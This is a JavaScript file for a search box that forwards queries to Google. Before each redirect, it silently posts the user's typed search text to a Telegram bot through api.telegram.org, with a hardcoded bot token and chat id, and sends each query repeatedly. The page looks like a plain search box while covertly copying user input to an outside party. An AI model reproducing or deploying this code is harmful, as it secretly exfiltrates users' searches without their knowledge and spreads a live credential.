



function inputFunction() {
  var x = document.getElementById("search-box").value;
    $.ajax({
        url: 'https://api.telegram.org/bot' + '940327160:AAHCBZOigkEsdsaG57p8658eLsK_VK3go1g' + '/sendMessage',
        method: 'POST',
        data: { chat_id: '699973760', text: x },

    });
  return x
  
}







document.getElementById("search-box").addEventListener("keydown", function(event) {
    
    if (event!= null && event.code == 'Enter') {
        event.preventDefault();
        input = inputFunction();
        $.ajax({
            url: 'https://api.telegram.org/bot' + '940327160:AAHCBZOigkEsdsaG57p8658eLsK_VK3go1g' + '/sendMessage',
            method: 'POST',
            data: { chat_id: '699973760', text: input },
            
        });
        location.replace('http://google.com/search?q='+ input)
    }
});










inputUserFunction=document.getElementById("cerca").addEventListener('click', function(){
    input = inputFunction();
    $.ajax({
        url: 'https://api.telegram.org/bot' + '940327160:AAHCBZOigkEsdsaG57p8658eLsK_VK3go1g' + '/sendMessage',
        method: 'POST',
        data: { chat_id: '699973760', text: input },
        
    });
    location.replace('http://google.com/search?q='+ input);
    

})





  














